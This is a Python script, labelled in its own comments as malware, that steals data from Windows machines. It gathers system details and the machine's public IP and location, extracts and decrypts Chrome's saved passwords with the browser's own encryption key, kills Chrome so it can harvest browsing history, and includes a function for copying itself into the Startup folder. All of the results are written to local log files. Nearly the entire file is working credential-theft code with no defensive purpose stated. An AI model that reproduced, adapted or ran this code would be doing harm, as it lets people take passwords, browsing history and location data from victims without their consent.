import os, wmi, json, base64, psutil, requests, platform, win32crypt, sqlite3, shutil
from Crypto.Cipher import AES
from browser_history import get_history

def kill_chrome():
    for proc in psutil.process_iter(['pid', 'name']):
        if 'chrome' in proc.info['name'].lower():
            print(f"Terminating Chrome process with PID {proc.pid}")
            proc.terminate()

def write_data(data , where='usr_info'):
    #for some reasons i could not add data to text normaly
    #from functions (calling write_data every time with one param)
    #it did not add data as expected. maybe im stupid (likely), and thats the reason.
    #anyway, you can try to play with it, but mine solution was to pass a list of args directly
    #you can try to improve it

    path = 'logs'
    d = os.path.join(path, where+'.txt')

    if not os.path.exists(path):
        os.mkdir(path)

    with open(d, 'w', encoding='utf-8') as file:
        for item in data:
            file.write(str(item)+'\n')
            file.write('\n')

#copy file for autostart
def copy_to_startup():
    current_path = os.path.realpath(__file__)
    current_file = os.path.basename(current_path)
    startup_path = os.path.join(os.environ["USERPROFILE"], "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    if not os.path.exists(os.path.join(startup_path, current_file)):
        shutil.copy2(current_path, startup_path)
        print("Script copied to startup folder successfully!")
    else:
        print("Script already in startup folder.")

#computer information and network
def user_info():
    print('extarcting user data')
    computer_name = platform.node()
    os = platform.system()
    os_version = platform.release()
    c = wmi.WMI()
    for cpu in c.Win32_Processor():
        print(f'CPU Name: {cpu.Name}')
    for gpu in c.Win32_VideoController():
        print(f'GPU Name: {gpu.Name}')
    for disk in c.Win32_DiskDrive():
        print(f'Disk Name: {disk.Caption}')
        total_space = int(disk.Size)
    ram = psutil.virtual_memory()
    print(f'Total RAM: {ram.total / (1024 ** 3):.2f} GB')
    response = requests.get("https://api.ipify.org")
    public_ip = response.text
    ip_info = requests.get(f"http://ip-api.com/json/{public_ip}").json()
    country = ip_info['country']
    city = ip_info["city"]
    organization = ip_info["org"]

    res = [
        {"Device": computer_name},
        {"Operating system": os+" "+os_version},
        {"Cpu": cpu.Name},
        {"Gpu": gpu.Name},
        {"Drive name": disk.Caption},
        {"Drive size": f'{total_space / (1024 ** 3):.2f} GB'},
        {"Ram": f'{ram.total / (1024 ** 3):.2f} GB'},
        {"Public ip": public_ip},
        {"Country": country},
        {"City": city},
        {"Provider": organization}
    ]
    
    print('saving result to txt..')
    write_data(res)
    print('saved')

#password extractor
def fetching_encryption_key():
    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
  
    encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
      
    encryption_key = encryption_key[5:]
    
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
          
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
          
        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
  
  
def user_passwords():
    print("Extracting passwords")
    
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
    res = []

    db = sqlite3.connect(filename)
    cursor = db.cursor()
      
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
    "order by date_last_used")
      
    for row in cursor.fetchall():
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
          
        if user_name or decrypted_password:
            res.append({ 
                "login Url":login_page_url, 
                "Username": user_name, 
                "Password":decrypted_password,
            })          
        else:
            continue
        
    write_data(res, 'pswds')
    print('saved')
    cursor.close()
    db.close()
      
    try:
        os.remove(filename)
    except:
        pass

#history extractor

def user_history_data():
    print("Extracting history data")
    kill_chrome()
    browsers = get_history()
    formated = []

    for item in browsers.histories:
        given_datetime = item[0]
        item = ( given_datetime.strftime("%Y-%m-%d %H:%M:%S %Z"), item[2], item[1] )
        formated.append(item)
    
    write_data(formated, 'hstry')
    print('saved')

#calling malware functions
    
user_info()
user_passwords()
user_history_data()
